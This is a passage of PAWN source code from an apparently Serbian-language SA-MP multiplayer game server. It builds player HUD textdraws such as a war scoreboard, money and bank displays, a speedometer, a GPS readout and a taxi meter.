        PlayerTextDrawAlignment(playerid,WARTextDraw[ playerid ][ 3 ], 2);
        PlayerTextDrawBackgroundColor(playerid,WARTextDraw[ playerid ][ 3 ], 255);
        PlayerTextDrawFont(playerid,WARTextDraw[ playerid ][ 3 ], 2);
        PlayerTextDrawLetterSize(playerid,WARTextDraw[ playerid ][ 3 ], 0.360000, 0.899999);
        PlayerTextDrawColor(playerid,WARTextDraw[ playerid ][ 3 ], -1);
        PlayerTextDrawSetOutline(playerid,WARTextDraw[ playerid ][ 3 ], 0);
        PlayerTextDrawSetProportional(playerid,WARTextDraw[ playerid ][ 3 ], 1);
        PlayerTextDrawSetShadow(playerid,WARTextDraw[ playerid ][ 3 ], 1);
        PlayerTextDrawSetSelectable(playerid,WARTextDraw[ playerid ][ 3 ], 0);

        WARTextDraw[ playerid ][ 4 ] = CreatePlayerTextDraw(playerid,608.000000, 234.000000, "Team 2");
        PlayerTextDrawAlignment(playerid,WARTextDraw[ playerid ][ 4 ], 2);
        PlayerTextDrawBackgroundColor(playerid,WARTextDraw[ playerid ][ 4 ], 255);
        PlayerTextDrawFont(playerid,WARTextDraw[ playerid ][ 4 ], 2);
        PlayerTextDrawLetterSize(playerid,WARTextDraw[ playerid ][ 4 ], 0.360000, 0.899999);
        PlayerTextDrawColor(playerid,WARTextDraw[ playerid ][ 4 ], -1);
        PlayerTextDrawSetOutline(playerid,WARTextDraw[ playerid ][ 4 ], 0);
        PlayerTextDrawSetProportional(playerid,WARTextDraw[ playerid ][ 4 ], 1);
        PlayerTextDrawSetShadow(playerid,WARTextDraw[ playerid ][ 4 ], 1);
        PlayerTextDrawSetSelectable(playerid,WARTextDraw[ playerid ][ 4 ], 0);

        WARTextDraw[ playerid ][ 5 ] = CreatePlayerTextDraw(playerid,506.000000, 248.000000, "Kills: 100~n~Deaths: 100~n~Players: 10");
        PlayerTextDrawBackgroundColor(playerid,WARTextDraw[ playerid ][ 5 ], 255);
        PlayerTextDrawFont(playerid,WARTextDraw[ playerid ][ 5 ], 2);
        PlayerTextDrawLetterSize(playerid,WARTextDraw[ playerid ][ 5 ], 0.230000, 0.899999);
        PlayerTextDrawColor(playerid,WARTextDraw[ playerid ][ 5 ], -1);
        PlayerTextDrawSetOutline(playerid,WARTextDraw[ playerid ][ 5 ], 0);
        PlayerTextDrawSetProportional(playerid,WARTextDraw[ playerid ][ 5 ], 1);
        PlayerTextDrawSetShadow(playerid,WARTextDraw[ playerid ][ 5 ], 1);
        PlayerTextDrawSetSelectable(playerid,WARTextDraw[ playerid ][ 5 ], 0);

        WARTextDraw[ playerid ][ 6 ] = CreatePlayerTextDraw(playerid,573.000000, 248.000000, "Kills: 100~n~Deaths: 100~n~Players: 10");
        PlayerTextDrawBackgroundColor(playerid,WARTextDraw[ playerid ][ 6 ], 255);
        PlayerTextDrawFont(playerid,WARTextDraw[ playerid ][ 6 ], 2);
        PlayerTextDrawLetterSize(playerid,WARTextDraw[ playerid ][ 6 ], 0.230000, 0.899999);
        PlayerTextDrawColor(playerid,WARTextDraw[ playerid ][ 6 ], -1);
        PlayerTextDrawSetOutline(playerid,WARTextDraw[ playerid ][ 6 ], 0);
        PlayerTextDrawSetProportional(playerid,WARTextDraw[ playerid ][ 6 ], 1);
        PlayerTextDrawSetShadow(playerid,WARTextDraw[ playerid ][ 6 ], 1);
        PlayerTextDrawSetSelectable(playerid,WARTextDraw[ playerid ][ 6 ], 0);

        WARTextDraw[ playerid ][ 7 ] = CreatePlayerTextDraw(playerid,568.000000, 275.000000, "-");
        PlayerTextDrawAlignment(playerid,WARTextDraw[ playerid ][ 7 ], 2);
        PlayerTextDrawBackgroundColor(playerid,WARTextDraw[ playerid ][ 7 ], 255);
        PlayerTextDrawFont(playerid,WARTextDraw[ playerid ][ 7 ], 2);
        PlayerTextDrawLetterSize(playerid,WARTextDraw[ playerid ][ 7 ], 12.080010, 0.899999);
        PlayerTextDrawColor(playerid,WARTextDraw[ playerid ][ 7 ], -1);
        PlayerTextDrawSetOutline(playerid,WARTextDraw[ playerid ][ 7 ], 0);
        PlayerTextDrawSetProportional(playerid,WARTextDraw[ playerid ][ 7 ], 1);
        PlayerTextDrawSetShadow(playerid,WARTextDraw[ playerid ][ 7 ], 1);
        PlayerTextDrawSetSelectable(playerid,WARTextDraw[ playerid ][ 7 ], 0);

        WARTextDraw[ playerid ][ 8 ] = CreatePlayerTextDraw(playerid,567.000000, 284.000000, "10:00");
        PlayerTextDrawAlignment(playerid,WARTextDraw[ playerid ][ 8 ], 2);
        PlayerTextDrawBackgroundColor(playerid,WARTextDraw[ playerid ][ 8 ], 255);
        PlayerTextDrawFont(playerid,WARTextDraw[ playerid ][ 8 ], 2);
        PlayerTextDrawLetterSize(playerid,WARTextDraw[ playerid ][ 8 ], 0.459999, 1.300000);
        PlayerTextDrawColor(playerid,WARTextDraw[ playerid ][ 8 ], -1);
        PlayerTextDrawSetOutline(playerid,WARTextDraw[ playerid ][ 8 ], 0);
        PlayerTextDrawSetProportional(playerid,WARTextDraw[ playerid ][ 8 ], 1);
        PlayerTextDrawSetShadow(playerid,WARTextDraw[ playerid ][ 8 ], 1);
        PlayerTextDrawSetSelectable(playerid,WARTextDraw[ playerid ][ 8 ], 0);

        for( new i = 0; i < 9; i ++ ) {
            PlayerTextDrawShow( playerid, WARTextDraw[ playerid ][ i ] );
        }
    }
    else if( show == false ) {
        for( new i = 0; i < 9; i ++ ) {
            PlayerTextDrawHide( playerid, WARTextDraw[ playerid ][ i ]);
            PlayerTextDrawDestroy(playerid, WARTextDraw[playerid][i]);
            WARTextDraw[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
        }
    }
}

stock CreatePlayerTextDraws( playerid ) {

    Novac_Info[playerid] = CreatePlayerTextDraw(playerid, 491.302276, 81.850288, "-$250");
    PlayerTextDrawLetterSize(playerid, Novac_Info[playerid], 0.362999, 1.175626);
    PlayerTextDrawAlignment(playerid, Novac_Info[playerid], 3);
    PlayerTextDrawColor(playerid, Novac_Info[playerid], -1);
    PlayerTextDrawSetShadow(playerid, Novac_Info[playerid], 2);
    PlayerTextDrawSetOutline(playerid, Novac_Info[playerid], 1);
    PlayerTextDrawBackgroundColor(playerid, Novac_Info[playerid], 255);
    PlayerTextDrawFont(playerid, Novac_Info[playerid], 3);
    PlayerTextDrawSetProportional(playerid, Novac_Info[playerid], 1);
	
	RadarCol[ playerid ] = CreatePlayerTextDraw( playerid, -5.000, -2.000, "~n~");
    PlayerTextDrawFont(playerid, RadarCol[ playerid ], 3);
    PlayerTextDrawUseBox(playerid, RadarCol[ playerid ], 1);
    PlayerTextDrawLetterSize(playerid, RadarCol[ playerid ], 0.500000, 50.300003);
    PlayerTextDrawBoxColor(playerid, RadarCol[ playerid ], 0xFF0000FF);
    PlayerTextDrawTextSize(playerid, RadarCol[ playerid ], 655.000, 625.000);
    PlayerTextDrawColor(playerid, RadarCol[ playerid ], -1);
    
    Fading[ playerid ] = CreatePlayerTextDraw( playerid, -5.000, -2.000, "~n~");
    PlayerTextDrawFont(playerid, Fading[ playerid ], 3);
    PlayerTextDrawUseBox(playerid, Fading[ playerid ], 1);
    PlayerTextDrawLetterSize(playerid, Fading[ playerid ], 0.500000, 50.300003);
    PlayerTextDrawBoxColor(playerid, Fading[ playerid ], -1);
    PlayerTextDrawTextSize(playerid, Fading[ playerid ], 655.000, 625.000);
    PlayerTextDrawColor(playerid, Fading[ playerid ], -1);
	
	//
	SpecTextDraw[ playerid ] = CreatePlayerTextDraw(playerid,270.000000, 330.000000, "~y~ID: ~w~241 ~n~~y~Ime: ~w~Harry_Winston ~n~~y~Novac: ~w~123536$ ~n~~y~Health: ~w~100");
	PlayerTextDrawBackgroundColor(playerid,SpecTextDraw[ playerid ], 255);
	PlayerTextDrawFont(playerid,SpecTextDraw[ playerid ], 2);
	PlayerTextDrawLetterSize(playerid,SpecTextDraw[ playerid ], 0.300000, 1.000000);
	PlayerTextDrawColor(playerid,SpecTextDraw[ playerid ], -1);
	PlayerTextDrawSetOutline(playerid,SpecTextDraw[ playerid ], 0);
	PlayerTextDrawSetProportional(playerid,SpecTextDraw[ playerid ], 1);
	PlayerTextDrawSetShadow(playerid,SpecTextDraw[ playerid ], 1);
	PlayerTextDrawSetSelectable(playerid,SpecTextDraw[ playerid ], 0);
	//

    BankaIgraca[playerid] = CreatePlayerTextDraw(playerid, 407.500000, 439.812500, "99999999$");
    PlayerTextDrawLetterSize(playerid, BankaIgraca[playerid], 0.143999, 0.523750);
    PlayerTextDrawAlignment(playerid, BankaIgraca[playerid], 2);
    PlayerTextDrawColor(playerid, BankaIgraca[playerid], -1);
    PlayerTextDrawSetShadow(playerid, BankaIgraca[playerid], 0);
    PlayerTextDrawSetOutline(playerid, BankaIgraca[playerid], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaIgraca[playerid], 255);
    PlayerTextDrawFont(playerid, BankaIgraca[playerid], 2);
    PlayerTextDrawSetProportional(playerid, BankaIgraca[playerid], 1);
    PlayerTextDrawSetShadow(playerid, BankaIgraca[playerid], 0);

    ZlatoIgraca[playerid] = CreatePlayerTextDraw(playerid, 466.000000, 439.812500, "99999g");
    PlayerTextDrawLetterSize(playerid, ZlatoIgraca[playerid], 0.143999, 0.523750);
    PlayerTextDrawAlignment(playerid, ZlatoIgraca[playerid], 2);
    PlayerTextDrawColor(playerid, ZlatoIgraca[playerid], -1);
    PlayerTextDrawSetShadow(playerid, ZlatoIgraca[playerid], 0);
    PlayerTextDrawSetOutline(playerid, ZlatoIgraca[playerid], 0);
    PlayerTextDrawBackgroundColor(playerid, ZlatoIgraca[playerid], 255);
    PlayerTextDrawFont(playerid, ZlatoIgraca[playerid], 2);
    PlayerTextDrawSetProportional(playerid, ZlatoIgraca[playerid], 1);
    PlayerTextDrawSetShadow(playerid, ZlatoIgraca[playerid], 0);

    SkinIgraca[playerid] = CreatePlayerTextDraw(playerid, 122.500000, 406.562500, "");
    PlayerTextDrawLetterSize(playerid, SkinIgraca[playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid, SkinIgraca[playerid], 98.000000, 69.000000);
    PlayerTextDrawAlignment(playerid, SkinIgraca[playerid], 1);
    PlayerTextDrawColor(playerid, SkinIgraca[playerid], -1);
    PlayerTextDrawSetShadow(playerid, SkinIgraca[playerid], 0);
    PlayerTextDrawSetOutline(playerid, SkinIgraca[playerid], 0);
    PlayerTextDrawBackgroundColor(playerid, SkinIgraca[playerid], 0);
    PlayerTextDrawFont(playerid, SkinIgraca[playerid], 5);
    PlayerTextDrawSetProportional(playerid, SkinIgraca[playerid], 0);
    PlayerTextDrawSetShadow(playerid, SkinIgraca[playerid], 0);
    PlayerTextDrawSetPreviewModel(playerid, SkinIgraca[playerid], 124);
    PlayerTextDrawSetPreviewRot(playerid, SkinIgraca[playerid], 0.000000, 0.000000, 0.000000, 1.000000);

    // LevelIgracaTD[playerid] = CreatePlayerTextDraw(playerid, 139.165496, 439.855895, "22"); //LEVEL
    // PlayerTextDrawLetterSize(playerid, LevelIgracaTD[playerid], 0.082666, 0.542222);
    // PlayerTextDrawAlignment(playerid, LevelIgracaTD[playerid], 1);
    // PlayerTextDrawColor(playerid, LevelIgracaTD[playerid], -1);
    // PlayerTextDrawSetShadow(playerid, LevelIgracaTD[playerid], 0);
    // PlayerTextDrawBackgroundColor(playerid, LevelIgracaTD[playerid], 255);
    // PlayerTextDrawFont(playerid, LevelIgracaTD[playerid], 2);
    // PlayerTextDrawSetProportional(playerid, LevelIgracaTD[playerid], 1);

    // DoPlateTD[playerid] = CreatePlayerTextDraw(playerid, 405.000000, 436.696289, "DO_PLATE:_59_MIN");
    // PlayerTextDrawLetterSize(playerid, DoPlateTD[playerid], 0.105415, 0.609628);
    // PlayerTextDrawAlignment(playerid, DoPlateTD[playerid], 1);
    // PlayerTextDrawColor(playerid, DoPlateTD[playerid], -1);
    // PlayerTextDrawSetShadow(playerid, DoPlateTD[playerid], 0);
    // PlayerTextDrawBackgroundColor(playerid, DoPlateTD[playerid], 255);
    // PlayerTextDrawFont(playerid, DoPlateTD[playerid], 2);
    // PlayerTextDrawSetProportional(playerid, DoPlateTD[playerid], 1);

    LokacijaIgracaTD[playerid] = CreatePlayerTextDraw(playerid, 56.000000, 438.062500, "Pirates_in_Men's_Pants");
    PlayerTextDrawLetterSize(playerid, LokacijaIgracaTD[playerid], 0.126000, 0.431875);
    PlayerTextDrawAlignment(playerid, LokacijaIgracaTD[playerid], 2);
    PlayerTextDrawColor(playerid, LokacijaIgracaTD[playerid], -1);
    PlayerTextDrawSetShadow(playerid, LokacijaIgracaTD[playerid], 0);
    PlayerTextDrawSetOutline(playerid, LokacijaIgracaTD[playerid], 0);
    PlayerTextDrawBackgroundColor(playerid, LokacijaIgracaTD[playerid], 255);
    PlayerTextDrawFont(playerid, LokacijaIgracaTD[playerid], 2);
    PlayerTextDrawSetProportional(playerid, LokacijaIgracaTD[playerid], 1);
    PlayerTextDrawSetShadow(playerid, LokacijaIgracaTD[playerid], 0);

    // PrljavNovacTD[playerid] = CreatePlayerTextDraw(playerid, 448.563873, 436.140777, "0"); //PRLJAVE PARE
    // PlayerTextDrawLetterSize(playerid, PrljavNovacTD[playerid], 0.097666, 0.679111);
    // PlayerTextDrawAlignment(playerid, PrljavNovacTD[playerid], 1);
    // PlayerTextDrawColor(playerid, PrljavNovacTD[playerid], -1);
    // PlayerTextDrawSetShadow(playerid, PrljavNovacTD[playerid], 0);
    // PlayerTextDrawBackgroundColor(playerid, PrljavNovacTD[playerid], 255);
    // PlayerTextDrawFont(playerid, PrljavNovacTD[playerid], 2);
    // PlayerTextDrawSetProportional(playerid, PrljavNovacTD[playerid], 1);

	WantedIgraca[playerid] = CreatePlayerTextDraw(playerid, 14.000024, 315.239929, "]]]]]]]]]]");
	PlayerTextDrawLetterSize(playerid, WantedIgraca[playerid], 0.355999, 1.161911);
	PlayerTextDrawAlignment(playerid, WantedIgraca[playerid], 1);
	PlayerTextDrawColor(playerid, WantedIgraca[playerid], -16776961);
	PlayerTextDrawSetShadow(playerid, WantedIgraca[playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, WantedIgraca[playerid], 255);
	PlayerTextDrawFont(playerid, WantedIgraca[playerid], 2);
	PlayerTextDrawSetProportional(playerid, WantedIgraca[playerid], 1);
	//
    PlayerGpsRadarText[ playerid ] = CreatePlayerTextDraw(playerid,320.000000, 380.000000, "Udaljenost: 0.0 metara~n~nigde");
	PlayerTextDrawAlignment(playerid,PlayerGpsRadarText[ playerid ], 2);
	PlayerTextDrawBackgroundColor(playerid,PlayerGpsRadarText[ playerid ], 255);
	PlayerTextDrawFont(playerid,PlayerGpsRadarText[ playerid ], 2);
	PlayerTextDrawLetterSize(playerid,PlayerGpsRadarText[ playerid ], 0.370000, 0.799999);
	PlayerTextDrawColor(playerid,PlayerGpsRadarText[ playerid ], -1);
	PlayerTextDrawSetOutline(playerid,PlayerGpsRadarText[ playerid ], 0);
	PlayerTextDrawSetProportional(playerid,PlayerGpsRadarText[ playerid ], 1);
	PlayerTextDrawSetShadow(playerid,PlayerGpsRadarText[ playerid ], 1);
	PlayerTextDrawSetSelectable(playerid,PlayerGpsRadarText[ playerid ], 0);
	PlayerTextDrawHide(playerid, PlayerGpsRadarText[ playerid ] );
	//
	Brzinomer[playerid][0] = CreatePlayerTextDraw(playerid, 552.916564, 413.100524, "LD_SPAC:white");
    PlayerTextDrawTextSize(playerid, Brzinomer[playerid][0], 93.000000, 18.000000);
    PlayerTextDrawAlignment(playerid, Brzinomer[playerid][0], 1);
    PlayerTextDrawColor(playerid, Brzinomer[playerid][0], -303174145);
    PlayerTextDrawSetShadow(playerid, Brzinomer[playerid][0], 0);
    PlayerTextDrawBackgroundColor(playerid, Brzinomer[playerid][0], 255);
    PlayerTextDrawFont(playerid, Brzinomer[playerid][0], 4);
    PlayerTextDrawSetProportional(playerid, Brzinomer[playerid][0], 0);

    Brzinomer[playerid][1] = CreatePlayerTextDraw(playerid, 581.067443, 411.825897, "I_N_F_E_R_N_U_S");
    PlayerTextDrawLetterSize(playerid, Brzinomer[playerid][1], 0.129162, 0.636295);
    PlayerTextDrawAlignment(playerid, Brzinomer[playerid][1], 1);
    PlayerTextDrawColor(playerid, Brzinomer[playerid][1], 255);
    PlayerTextDrawSetShadow(playerid, Brzinomer[playerid][1], 0);
    PlayerTextDrawBackgroundColor(playerid, Brzinomer[playerid][1], 255);
    PlayerTextDrawFont(playerid, Brzinomer[playerid][1], 2);
    PlayerTextDrawSetProportional(playerid, Brzinomer[playerid][1], 1);

    Brzinomer[playerid][2] = CreatePlayerTextDraw(playerid, 592.433044, 419.185974, "90");
    PlayerTextDrawLetterSize(playerid, Brzinomer[playerid][2], 0.163332, 1.102221);
    PlayerTextDrawAlignment(playerid, Brzinomer[playerid][2], 1);
    PlayerTextDrawColor(playerid, Brzinomer[playerid][2], 255);
    PlayerTextDrawSetShadow(playerid, Brzinomer[playerid][2], 0);
    PlayerTextDrawBackgroundColor(playerid, Brzinomer[playerid][2], 255);
    PlayerTextDrawFont(playerid, Brzinomer[playerid][2], 2);
    PlayerTextDrawSetProportional(playerid, Brzinomer[playerid][2], 1);

    Brzinomer[playerid][3] = CreatePlayerTextDraw(playerid, 570.386352, 422.934112, "KM/H");
    PlayerTextDrawLetterSize(playerid, Brzinomer[playerid][3], 0.084995, 0.516295);
    PlayerTextDrawAlignment(playerid, Brzinomer[playerid][3], 1);
    PlayerTextDrawColor(playerid, Brzinomer[playerid][3], 255);
    PlayerTextDrawSetShadow(playerid, Brzinomer[playerid][3], 0);
    PlayerTextDrawBackgroundColor(playerid, Brzinomer[playerid][3], 255);
    PlayerTextDrawFont(playerid, Brzinomer[playerid][3], 2);
    PlayerTextDrawSetProportional(playerid, Brzinomer[playerid][3], 1);

    Brzinomer[playerid][4] = CreatePlayerTextDraw(playerid, 559.708068, 419.686004, "_");
    PlayerTextDrawLetterSize(playerid, Brzinomer[playerid][4], 0.157912, 0.998516);
    PlayerTextDrawAlignment(playerid, Brzinomer[playerid][4], 1);
    PlayerTextDrawColor(playerid, Brzinomer[playerid][4], 0x00000000);
    PlayerTextDrawSetShadow(playerid, Brzinomer[playerid][4], 0);
    PlayerTextDrawBackgroundColor(playerid, Brzinomer[playerid][4], 255);
    PlayerTextDrawFont(playerid, Brzinomer[playerid][4], 2);
    PlayerTextDrawSetProportional(playerid, Brzinomer[playerid][4], 1);

    Brzinomer[playerid][5] = CreatePlayerTextDraw(playerid, 621.492980, 419.886016, "0");
    PlayerTextDrawLetterSize(playerid, Brzinomer[playerid][5], 0.157498, 0.972590);
    PlayerTextDrawAlignment(playerid, Brzinomer[playerid][5], 1);
    PlayerTextDrawColor(playerid, Brzinomer[playerid][5], 255);
    PlayerTextDrawSetShadow(playerid, Brzinomer[playerid][5], 0);
    PlayerTextDrawBackgroundColor(playerid, Brzinomer[playerid][5], 255);
    PlayerTextDrawFont(playerid, Brzinomer[playerid][5], 2);
    PlayerTextDrawSetProportional(playerid, Brzinomer[playerid][5], 1);

    Brzinomer[playerid][6] = CreatePlayerTextDraw(playerid, 631.822692, 422.478607, "L");
    PlayerTextDrawLetterSize(playerid, Brzinomer[playerid][6], 0.122914, 0.645923);
    PlayerTextDrawAlignment(playerid, Brzinomer[playerid][6], 1);
    PlayerTextDrawColor(playerid, Brzinomer[playerid][6], 255);
    PlayerTextDrawSetShadow(playerid, Brzinomer[playerid][6], 0);
    PlayerTextDrawBackgroundColor(playerid, Brzinomer[playerid][6], 255);
    PlayerTextDrawFont(playerid, Brzinomer[playerid][6], 2);
    PlayerTextDrawSetProportional(playerid, Brzinomer[playerid][6], 1);

    Brzinomer[playerid][7] = CreatePlayerTextDraw(playerid, 553.566833, 413.740722, "LD_SPAC:white");
    PlayerTextDrawTextSize(playerid, Brzinomer[playerid][7], 7.000000, 0.939997);
    PlayerTextDrawAlignment(playerid, Brzinomer[playerid][7], 1);
    PlayerTextDrawColor(playerid, Brzinomer[playerid][7], 255);
    PlayerTextDrawSetShadow(playerid, Brzinomer[playerid][7], 0);
    PlayerTextDrawBackgroundColor(playerid, Brzinomer[playerid][7], 255);
    PlayerTextDrawFont(playerid, Brzinomer[playerid][7], 4);
    PlayerTextDrawSetProportional(playerid, Brzinomer[playerid][7], 0);
    PlayerTextDrawSetSelectable(playerid, Brzinomer[playerid][7], true);

    Brzinomer[playerid][8] = CreatePlayerTextDraw(playerid, 632.117004, 413.740600, "LD_SPAC:white");
    PlayerTextDrawTextSize(playerid, Brzinomer[playerid][8], 7.000000, 0.939997);
    PlayerTextDrawAlignment(playerid, Brzinomer[playerid][8], 1);
    PlayerTextDrawColor(playerid, Brzinomer[playerid][8], 255);
    PlayerTextDrawSetShadow(playerid, Brzinomer[playerid][8], 0);
    PlayerTextDrawBackgroundColor(playerid, Brzinomer[playerid][8], 255);
    PlayerTextDrawFont(playerid, Brzinomer[playerid][8], 4);
    PlayerTextDrawSetProportional(playerid, Brzinomer[playerid][8], 0);
    PlayerTextDrawSetSelectable(playerid, Brzinomer[playerid][8], true);

    Brzinomer[playerid][9] = CreatePlayerTextDraw(playerid, 553.483642, 414.777587, "LD_SPAC:white");
    PlayerTextDrawTextSize(playerid, Brzinomer[playerid][9], 0.829999, 5.510011);
    PlayerTextDrawAlignment(playerid, Brzinomer[playerid][9], 1);
    PlayerTextDrawColor(playerid, Brzinomer[playerid][9], 255);
    PlayerTextDrawSetShadow(playerid, Brzinomer[playerid][9], 0);
    PlayerTextDrawBackgroundColor(playerid, Brzinomer[playerid][9], 255);
    PlayerTextDrawFont(playerid, Brzinomer[playerid][9], 4);
    PlayerTextDrawSetProportional(playerid, Brzinomer[playerid][9], 0);
    PlayerTextDrawSetSelectable(playerid, Brzinomer[playerid][9], true);

    Brzinomer[playerid][10] = CreatePlayerTextDraw(playerid, 638.366882, 414.777526, "LD_SPAC:white");
    PlayerTextDrawTextSize(playerid, Brzinomer[playerid][10], 0.829999, 5.510011);
    PlayerTextDrawAlignment(playerid, Brzinomer[playerid][10], 1);
    PlayerTextDrawColor(playerid, Brzinomer[playerid][10], 255);
    PlayerTextDrawSetShadow(playerid, Brzinomer[playerid][10], 0);
    PlayerTextDrawBackgroundColor(playerid, Brzinomer[playerid][10], 255);
    PlayerTextDrawFont(playerid, Brzinomer[playerid][10], 4);
    PlayerTextDrawSetProportional(playerid, Brzinomer[playerid][10], 0);
    PlayerTextDrawSetSelectable(playerid, Brzinomer[playerid][10], true);


    //

    TaxistaTD[playerid][0] = CreatePlayerTextDraw(playerid, 256.250061, 346.592498, "box");
    PlayerTextDrawLetterSize(playerid, TaxistaTD[playerid][0], 0.000000, 5.541668);
    PlayerTextDrawTextSize(playerid, TaxistaTD[playerid][0], 381.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, TaxistaTD[playerid][0], 1);
    PlayerTextDrawColor(playerid, TaxistaTD[playerid][0], -1);
    PlayerTextDrawUseBox(playerid, TaxistaTD[playerid][0], 1);
    PlayerTextDrawBoxColor(playerid, TaxistaTD[playerid][0], 572662502);
    PlayerTextDrawSetShadow(playerid, TaxistaTD[playerid][0], 0);
    PlayerTextDrawBackgroundColor(playerid, TaxistaTD[playerid][0], 255);
    PlayerTextDrawFont(playerid, TaxistaTD[playerid][0], 1);
    PlayerTextDrawSetProportional(playerid, TaxistaTD[playerid][0], 1);

    TaxistaTD[playerid][1] = CreatePlayerTextDraw(playerid, 295.833404, 345.555358, "TaxiMetar");
    PlayerTextDrawLetterSize(playerid, TaxistaTD[playerid][1], 0.220000, 1.169628);
    PlayerTextDrawAlignment(playerid, TaxistaTD[playerid][1], 1);
    PlayerTextDrawColor(playerid, TaxistaTD[playerid][1], -1);
    PlayerTextDrawSetShadow(playerid, TaxistaTD[playerid][1], 0);
    PlayerTextDrawBackgroundColor(playerid, TaxistaTD[playerid][1], 255);
    PlayerTextDrawFont(playerid, TaxistaTD[playerid][1], 1);
    PlayerTextDrawSetProportional(playerid, TaxistaTD[playerid][1], 1);

    TaxistaTD[playerid][2] = CreatePlayerTextDraw(playerid, 268.333557, 361.629608, "Cena");
    PlayerTextDrawLetterSize(playerid, TaxistaTD[playerid][2], 0.237083, 1.159259);
    PlayerTextDrawAlignment(playerid, TaxistaTD[playerid][2], 1);
    PlayerTextDrawColor(playerid, TaxistaTD[playerid][2], -1);
    PlayerTextDrawSetShadow(playerid, TaxistaTD[playerid][2], 0);
    PlayerTextDrawBackgroundColor(playerid, TaxistaTD[playerid][2], 255);
    PlayerTextDrawFont(playerid, TaxistaTD[playerid][2], 1);
    PlayerTextDrawSetProportional(playerid, TaxistaTD[playerid][2], 1);

    TaxistaTD[playerid][3] = CreatePlayerTextDraw(playerid, 269.583465, 379.777862, "Lokacija");
    PlayerTextDrawLetterSize(playerid, TaxistaTD[playerid][3], 0.217916, 1.221482);
    PlayerTextDrawAlignment(playerid, TaxistaTD[playerid][3], 1);
    PlayerTextDrawColor(playerid, TaxistaTD[playerid][3], -1);
    PlayerTextDrawSetShadow(playerid, TaxistaTD[playerid][3], 0);
    PlayerTextDrawBackgroundColor(playerid, TaxistaTD[playerid][3], 255);
    PlayerTextDrawFont(playerid, TaxistaTD[playerid][3], 1);
    PlayerTextDrawSetProportional(playerid, TaxistaTD[playerid][3], 1);

    TaxistaTD[playerid][4] = CreatePlayerTextDraw(playerid, 347.499969, 359.037109, "box");
    PlayerTextDrawLetterSize(playerid, TaxistaTD[playerid][4], 0.000000, 1.458331);
    PlayerTextDrawTextSize(playerid, TaxistaTD[playerid][4], 377.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, TaxistaTD[playerid][4], 1);
    PlayerTextDrawColor(playerid, TaxistaTD[playerid][4], -1);
    PlayerTextDrawUseBox(playerid, TaxistaTD[playerid][4], 1);
    PlayerTextDrawBoxColor(playerid, TaxistaTD[playerid][4], 286331366);
    PlayerTextDrawSetShadow(playerid, TaxistaTD[playerid][4], 0);
    PlayerTextDrawBackgroundColor(playerid, TaxistaTD[playerid][4], 255);
    PlayerTextDrawFont(playerid, TaxistaTD[playerid][4], 1);
    PlayerTextDrawSetProportional(playerid, TaxistaTD[playerid][4], 1);

    TaxistaTD[playerid][5] = CreatePlayerTextDraw(playerid, 303.750244, 379.259368, "box");
    PlayerTextDrawLetterSize(playerid, TaxistaTD[playerid][5], 0.000000, 1.458330);
    PlayerTextDrawTextSize(playerid, TaxistaTD[playerid][5], 378.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, TaxistaTD[playerid][5], 1);
    PlayerTextDrawColor(playerid, TaxistaTD[playerid][5], -1);
    PlayerTextDrawUseBox(playerid, TaxistaTD[playerid][5], 1);
    PlayerTextDrawBoxColor(playerid, TaxistaTD[playerid][5], 286331366);
    PlayerTextDrawSetShadow(playerid, TaxistaTD[playerid][5], 0);
    PlayerTextDrawBackgroundColor(playerid, TaxistaTD[playerid][5], 255);
    PlayerTextDrawFont(playerid, TaxistaTD[playerid][5], 1);
    PlayerTextDrawSetProportional(playerid, TaxistaTD[playerid][5], 1);

    TaxistaTD[playerid][6] = CreatePlayerTextDraw(playerid, 361.666625, 359.037078, "1245$");
    PlayerTextDrawLetterSize(playerid, TaxistaTD[playerid][6], 0.186666, 1.221482);
    PlayerTextDrawAlignment(playerid, TaxistaTD[playerid][6], 2);
    PlayerTextDrawColor(playerid, TaxistaTD[playerid][6], -1);
    PlayerTextDrawSetShadow(playerid, TaxistaTD[playerid][6], 0);
    PlayerTextDrawBackgroundColor(playerid, TaxistaTD[playerid][6], 255);
    PlayerTextDrawFont(playerid, TaxistaTD[playerid][6], 1);
    PlayerTextDrawSetProportional(playerid, TaxistaTD[playerid][6], 1);

    TaxistaTD[playerid][7] = CreatePlayerTextDraw(playerid, 341.250000, 378.740783, "Pirates in Men's Pants");
    PlayerTextDrawLetterSize(playerid, TaxistaTD[playerid][7], 0.186666, 1.221482);
    PlayerTextDrawTextSize(playerid, TaxistaTD[playerid][7], 0.000000, 329.000000);
    PlayerTextDrawAlignment(playerid, TaxistaTD[playerid][7], 2);
    PlayerTextDrawColor(playerid, TaxistaTD[playerid][7], -1);
    PlayerTextDrawSetShadow(playerid, TaxistaTD[playerid][7], 0);
    PlayerTextDrawBackgroundColor(playerid, TaxistaTD[playerid][7], 255);
    PlayerTextDrawFont(playerid, TaxistaTD[playerid][7], 1);
    PlayerTextDrawSetProportional(playerid, TaxistaTD[playerid][7], 1);

    CrniTD[playerid] = CreatePlayerTextDraw(playerid, -4.333373, -2.474085, "box");
    PlayerTextDrawLetterSize(playerid, CrniTD[playerid], 0.000000, 55.066673);
    PlayerTextDrawTextSize(playerid, CrniTD[playerid], 793.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, CrniTD[playerid], 1);
    PlayerTextDrawColor(playerid, CrniTD[playerid], -1);
    PlayerTextDrawUseBox(playerid, CrniTD[playerid], 1);
    PlayerTextDrawBoxColor(playerid, CrniTD[playerid], 255);
    PlayerTextDrawSetShadow(playerid, CrniTD[playerid], 0);
    PlayerTextDrawBackgroundColor(playerid, CrniTD[playerid], 255);
    PlayerTextDrawFont(playerid, CrniTD[playerid], 1);
    PlayerTextDrawSetProportional(playerid, CrniTD[playerid], 1);

    TeksticTD[playerid] = CreatePlayerTextDraw(playerid, 313.666656, 192.903808, "TEXT");
    PlayerTextDrawLetterSize(playerid, TeksticTD[playerid], 0.734665, 2.931555);
    PlayerTextDrawAlignment(playerid, TeksticTD[playerid], 2);
    PlayerTextDrawColor(playerid, TeksticTD[playerid], -1);
    PlayerTextDrawSetShadow(playerid, TeksticTD[playerid], 0);
    PlayerTextDrawBackgroundColor(playerid, TeksticTD[playerid], 255);
    PlayerTextDrawFont(playerid, TeksticTD[playerid], 1);
